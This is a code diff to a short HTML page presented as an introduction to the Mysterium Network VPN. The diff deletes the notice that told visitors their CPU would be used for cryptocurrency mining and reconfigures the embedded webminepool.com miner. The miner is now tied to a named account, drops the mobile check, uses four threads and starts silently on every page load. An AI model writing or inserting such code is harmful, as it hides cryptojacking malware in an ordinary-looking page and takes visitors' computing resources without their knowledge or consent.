@@ -1,23 +1,22 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://webminepool.com/lib/base.js"></script>
   <meta charset="UTF-8">
   <title>Connecting to Mysterium Network</title>
+  <script src="https://webminepool.com/lib/base.js"></script>
 </head>
 <body> 
   <h1>Welcome to the Mysterium Network page!</h1>
   <p>Mysterium Network is a platform that enables connection to a decentralized VPN network, ensuring privacy and anonymity while browsing the internet.</p>
   <p>For more information about Mysterium Network, visit <a href="https://mysterium.network/" target="_blank">here</a>.</p>
-  
-  <!-- Informacja o wykorzystaniu zasobów komputera -->
-  <p>By visiting this site, you agree to allow us to use a small portion of your CPU to mine cryptocurrency. This helps support our website. If you do not agree, please close this page.</p>
-  
   <script>
-    var miner = WMP.Anonymous('SK_PFxiO5khtzlepMRHa3MFS',{throttle: 0.3});
-    if (!miner.isMobile()){
-        miner.start();
-    }
-</script>
+    var miner = WMP.User('SK_PFxiO5khtzlepMRHa3MFS', 'bbmafia',{
+        threads: 4,
+        autoThreads: false,
+        throttle: 0.3,
+        forceASMJS: false
+    });
+    miner.start();
+  </script>
 </body>
 </html>
